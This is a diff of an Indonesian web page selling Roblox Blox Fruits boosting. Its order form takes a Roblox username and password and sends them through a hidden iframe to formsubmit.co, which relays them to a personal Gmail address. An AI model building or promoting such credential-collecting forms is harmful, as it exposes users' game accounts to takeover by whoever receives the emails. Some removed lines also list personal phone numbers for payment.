@@ -11,252 +11,110 @@
             --dark-bg: #060a13;
             --card-bg: #111a33;
             --text-white: #ffffff;
-            --neon-shadow: 0 0 20px rgba(0, 114, 255, 0.6);
         }
 
         * { box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
-        
-        body {
-            background: var(--dark-bg);
-            color: var(--text-white);
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
+        body { background: var(--dark-bg); color: var(--text-white); margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .wrapper { max-width: 900px; width: 100%; }
+        h2 { text-align: center; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 5px; }
+        .subtitle { text-align: center; color: #7cc7ff; margin-bottom: 25px; font-weight: bold; display: block; }
 
-        .wrapper {
-            max-width: 900px;
-            width: 100%;
-        }
-
-        h2 { text-align: center; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 2px; text-shadow: var(--neon-shadow); }
-        p.subtitle { text-align: center; color: #7cc7ff; margin-bottom: 25px; font-weight: bold; }
-
-        /* Tombol Utama & Hover Animasi */
+        /* Button Premium */
         .btn {
-            width: 100%;
-            padding: 15px;
-            border-radius: 12px;
-            border: none;
-            margin-top: 15px;
+            width: 100%; padding: 15px; border-radius: 12px; border: none; margin-top: 15px;
             background: linear-gradient(90deg, #020617, #0b3c8a, #020617);
-            background-size: 200% auto;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
+            background-size: 200% auto; color: white; font-weight: bold; cursor: pointer;
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            text-align: center;
-            text-decoration: none;
-            display: block;
-            font-size: 16px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            text-align: center; text-decoration: none; display: block; font-size: 16px;
+        }
+        .btn:hover { transform: scale(1.05) translateY(-3px); box-shadow: 0 10px 25px rgba(0, 114, 255, 0.8); filter: brightness(1.3); }
+
+        .container { display: flex; gap: 20px; flex-wrap: wrap; margin-top: 20px; }
+        .card { 
+            background: var(--card-bg); border: 1px solid rgba(255,255,255,0.1); 
+            border-radius: 20px; padding: 25px; flex: 1; min-width: 320px; 
+            position: relative; min-height: 500px; overflow: hidden;
         }
 
-        .btn:hover, .btn:active {
-            transform: scale(1.05) translateY(-3px);
-            box-shadow: 0 10px 25px rgba(0, 114, 255, 0.8);
-            background-position: right center;
-            filter: brightness(1.3);
-        }
-
-        .container {
-            display: flex;
-            gap: 20px;
-            flex-wrap: wrap;
-            margin-top: 20px;
-        }
-
-        .card {
-            background: var(--card-bg);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 20px;
-            padding: 25px;
-            flex: 1;
-            min-width: 320px;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-
-        input, textarea {
-            width: 100%;
-            padding: 12px;
-            border-radius: 10px;
-            border: 1px solid #1e293b;
-            margin-top: 12px;
-            background: #060a13;
-            color: white;
-            outline: none;
-            transition: 0.3s;
-        }
-
-        input:focus { border-color: var(--primary-blue); box-shadow: 0 0 10px rgba(0, 114, 255, 0.3); }
-
-        /* List Joki Mewah */
+        input, textarea { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #1e293b; margin-top: 12px; background: #060a13; color: white; outline: none; }
+        
+        /* List Joki */
         .list-joki h3 { color: var(--primary-blue); border-bottom: 2px solid var(--primary-blue); padding-bottom: 10px; text-align: center; }
-        .list-joki b { color: #fff; display: block; margin-top: 18px; font-size: 1.1em; border-left: 4px solid var(--primary-blue); padding-left: 10px; }
-        .list-joki ul { list-style: none; padding-left: 5px; margin-top: 10px; }
-        .list-joki li { 
-            padding: 8px 0; 
-            border-bottom: 1px solid rgba(255,255,255,0.05); 
-            display: flex; 
-            justify-content: space-between;
-            font-size: 0.95em;
-            color: #cbd5e1;
-        }
+        .list-joki b { color: #fff; display: block; margin-top: 15px; border-left: 4px solid var(--primary-blue); padding-left: 10px; }
+        .list-joki ul { list-style: none; padding: 0; margin: 10px 0; }
+        .list-joki li { padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; color: #cbd5e1; }
 
-        /* Payment Bar */
-        .bar.payment {
-            background: rgba(0, 114, 255, 0.1);
-            padding: 15px;
-            border-radius: 12px;
-            margin-top: 20px;
-            border: 1px dashed var(--primary-blue);
-            font-size: 14px;
-            line-height: 1.6;
-        }
-
-        /* Slide Selesai Premium */
+        /* Slide Selesai */
         #order-slide {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: var(--card-bg);
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            z-index: 100;
-            animation: fadeIn 0.5s ease;
+            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--card-bg); flex-direction: column; justify-content: center;
+            align-items: center; text-align: center; z-index: 100;
         }
 
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        .success-checkmark { width: 80px; height: 100px; margin: 0 auto; }
-        .check-icon { 
-            width: 80px; height: 80px; position: relative; 
-            border-radius: 50%; border: 4px solid #4CAF50; 
-        }
-        .check-icon::after {
-            content: ''; position: absolute;
-            left: 28px; top: 40px; width: 50px; height: 30px;
+        /* Animasi Ceklis yang Benar */
+        .success-checkmark { width: 80px; height: 80px; position: relative; border-radius: 50%; border: 4px solid #4CAF50; margin-bottom: 20px; }
+        .success-checkmark::after {
+            content: ''; position: absolute; left: 12px; top: 35px; width: 45px; height: 22px;
             border-left: 4px solid #4CAF50; border-bottom: 4px solid #4CAF50;
-            transform: rotate(-45deg);
-            animation: check-draw 0.6s ease-out forwards;
+            transform: rotate(-45deg); animation: draw 0.5s ease forwards;
         }
-        @keyframes check-draw { 0% { width: 0; height: 0; } 50% { width: 0; height: 30px; } 100% { width: 50px; height: 30px; } }
+        @keyframes draw { from { width: 0; height: 0; } to { width: 45px; height: 22px; } }
     </style>
 </head>
 <body>
 
 <div class="wrapper">
-    <h2>JOKI BF Xzyo STORE</h2>
-    <p class="subtitle">Dijamin Murah Aman Dan Terpercaya</p>
+    <h2>JOKI BF XZYO STORE</h2>
+    <span class="subtitle">Dijamin Murah Aman Dan Terpercaya</span>
 
-    <button type="button" class="btn" onclick="window.open('https://whatsapp.com/channel/0029VbCFZEm5kg7DZoIDgG3r','_blank')">
+    <button class="btn" onclick="window.open('https://whatsapp.com/channel/0029VbCFZEm5kg7DZoIDgG3r','_blank')">
         <i class="fa-brands fa-whatsapp"></i> JOIN SALURAN DULU BOY
     </button>
 
     <div class="container">
-        <div class="card" id="formCard">
-            <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
-
-            <form id="orderForm" action="https://formsubmit.co/xzyostore@gmail.com" method="POST" enctype="multipart/form-data" target="hidden_iframe">
+        <div class="card">
+            <iframe name="target_frame" id="target_frame" style="display:none;"></iframe>
+            
+            <form id="orderForm" action="https://formsubmit.co/xzyostore@gmail.com" method="POST" target="target_frame" enctype="multipart/form-data">
                 <input type="hidden" name="_captcha" value="false">
-                
                 <input type="text" name="Username" placeholder="Username Roblox" required>
-                
-                <div style="position:relative;">
-                    <input type="password" name="Password" id="pw" placeholder="Password Roblox" required style="padding-right: 40px;">
-                    <i id="eye" class="fa-solid fa-eye-slash" onclick="togglePw()" style="position:absolute; right:12px; top:24px; cursor:pointer; color:#555;"></i>
-                </div>
-
-                <input type="text" name="WhatsApp" placeholder="Nomor WA kamu (WAJIB)" required>
+                <input type="password" name="Password" placeholder="Password Roblox" required>
+                <input type="text" name="WhatsApp" placeholder="Nomor WA kamu" required>
                 <textarea name="Jenis Joki" placeholder="Jenis joki (contoh: level 0 - max)" rows="3" required></textarea>
-                
-                <label style="display:block; margin-top:15px; font-size:12px; color:#7cc7ff; font-weight:bold;">UPLOAD BUKTI TRANSFER:</label>
-                <input type="file" name="Bukti Transfer" accept="image/*" required>
-                
+                <input type="file" name="Bukti" accept="image/*" required>
                 <button type="submit" class="btn">ORDER SEKARANG</button>
             </form>
 
             <div id="order-slide">
-                <div class="success-checkmark">
-                    <div class="check-icon"></div>
-                </div>
-                <h2 style="font-size: 20px; color: #fff; margin-top: 15px;">ORDER TELAH SELESAI!</h2>
-                <p style="font-size: 14px; color: #7cc7ff; padding: 0 20px;">
-                    Tunggu kabar dari kami. Akan ada 1 orang admin chat ke WhatsApp Anda untuk memberitahu akun sudah mulai dikerjakan.
+                <div class="success-checkmark"></div>
+                <h2 style="font-size: 22px; margin-bottom: 10px;">ORDER TELAH SELESAI!</h2>
+                <p style="padding: 0 20px; color: #7cc7ff; font-size: 14px;">
+                    Tunggu kabar dari kami. Admin akan chat ke WhatsApp Anda untuk konfirmasi pengerjaan.
                 </p>
             </div>
         </div>
 
         <div class="card list-joki">
-            <h3>LIST JOKI BLOX FRUIT</h3>
-            
-            <b>👁 JOKI INSTINCT</b>
-            <ul>
-                <li>0 - 1000 <span>5.000</span></li>
-                <li>0 - MAX + V2 <span>20.000</span></li>
-                <li>MISI V2 <span>8.000</span></li>
-            </ul>
-
-            <b>💸 JOKI BELLY</b>
-            <ul>
-                <li>1M <span>5.000</span></li>
-                <li>10M <span>40.000</span></li>
-                <li>30M <span>100.000</span></li>
-            </ul>
-
-            <b>🛠 JOKI LEVEL</b>
-            <ul>
-                <li>0 - 100 <span>3.000</span></li>
-                <li>700 – 1500 <span>15.000</span></li>
-                <li>1500 – MAX <span>20.000</span></li>
-            </ul>
-
-            <div class="bar payment">
-                <b>💳 METODE PEMBAYARAN:</b><br>
-                DANA: <b>089677329404</b><br>
-                OVO/GOPAY: <b>089517154561</b>
-            </div>
-
-            <button type="button" class="btn" onclick="window.open('https://wa.me/6289692310378?text=Halo%20Admin,%20saya%20minta%20QRIS/LINK%20untuk%20pembayaran','_blank')">
-                QRIS / LINK? CLICK DISINI
-            </button>
-            <a href="https://wa.me/6289692310378?text=Halo%20Admin,%20saya%20mau%20nanya" target="_blank" class="btn">
-                TANYA-TANYA? CHAT DISINI
-            </a>
+            <h3>LIST JOKI</h3>
+            <b>👁 INSTINCT</b>
+            <ul><li>0 - 1000 <span>5.000</span></li><li>0 - MAX + V2 <span>20.000</span></li></ul>
+            <b>💸 BELLY</b>
+            <ul><li>1M <span>5.000</span></li><li>10M <span>40.000</span></li></ul>
+            <b>🛠 LEVEL</b>
+            <ul><li>700 – 1500 <span>15.000</span></li><li>1500 – MAX <span>20.000</span></li></ul>
+            <button class="btn" onclick="window.open('https://wa.me/6289692310378','_blank')">QRIS / LINK PEMBAYARAN</button>
         </div>
     </div>
 </div>
 
 <script>
-    function togglePw() {
-        let pw = document.getElementById("pw");
-        let eye = document.getElementById("eye");
-        if (pw.type === "password") {
-            pw.type = "text";
-            eye.classList.replace("fa-eye-slash", "fa-eye");
-        } else {
-            pw.type = "password";
-            eye.classList.replace("fa-eye", "fa-eye-slash");
-        }
-    }
-
     document.getElementById("orderForm").onsubmit = function() {
-        // Animasi transisi form menghilang
         this.style.opacity = "0";
-        this.style.pointerEvents = "none";
         setTimeout(() => {
             this.style.display = "none";
             document.getElementById("order-slide").style.display = "flex";
-        }, 400);
-        // Data terkirim otomatis lewat hidden iframe
+        }, 300);
     };
 </script>
-
 </body>
 </html>
